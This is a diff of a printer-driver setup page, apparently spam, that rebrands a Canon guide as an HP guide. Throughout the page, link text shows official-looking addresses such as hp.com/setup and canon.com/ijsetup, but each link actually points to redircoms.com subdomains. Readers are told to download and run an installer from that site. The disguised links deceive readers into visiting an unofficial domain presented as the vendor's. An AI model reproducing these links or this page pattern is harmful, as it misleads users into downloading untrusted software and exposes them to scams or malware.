@@ -1,5 +1,5 @@
 ##################
-How Do I Download, Install, and Set Up My Canon Printer Driver?
+How Do I Download, Install, and Set Up My HP Printer Driver?
 ##################
 
 .. meta::
@@ -14,8 +14,8 @@ How Do I Download, Install, and Set Up My Canon Printer Driver?
       :width: 350px
       :align: center
       :height: 100px
-      :alt: canon.com/ijsetup
-      :target: https://can.redircoms.com
+      :alt: hp.com/setup
+      :target: https://hp.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,15 +28,15 @@ How Do I Download, Install, and Set Up My Canon Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your Canon printer driver on your computer. Follow each stage one by one to successfully connect your printer via `canon.com/ijsetup <https://can.redircoms.com>`_. Canon’s setup site provides the latest drivers and easy instructions. It’s the fastest way to ensure your printer works correctly with your computer. Visit `canon.com/ijsetup <https://can.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
 
 **********
-Steps to Download Canon Printer Driver
+Steps to Download HP Printer Driver
 **********
 
-1. Open a web browser and go to `canon.com/ijsetup <https://can.redircoms.com>`_.
+1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
 
-2. Enter your Canon printer model in the search box.
+2. Enter your HP printer model in the search box.
 
 3. Select your operating system if prompted.
 
@@ -45,7 +45,7 @@ Steps to Download Canon Printer Driver
 5. Save the installer file to your computer.
 
 **********
-Steps to Install Canon Printer Driver
+Steps to Install HP Printer Driver
 **********
 
 1. Locate the downloaded installer file on your computer.
@@ -59,14 +59,14 @@ Steps to Install Canon Printer Driver
 5. Complete the installation by clicking **Finish**.
 
 **********
-Setting Up Your Canon Printer
+Setting Up Your HP Printer
 **********
 
-1. Make sure your Canon printer is powered on.
+1. Make sure your HP printer is powered on.
 
 2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
 
-3. Open the Canon driver or utility you installed.
+3. Open the HP driver or utility you installed.
 
 4. Follow on-screen prompts to detect and connect your printer.
 
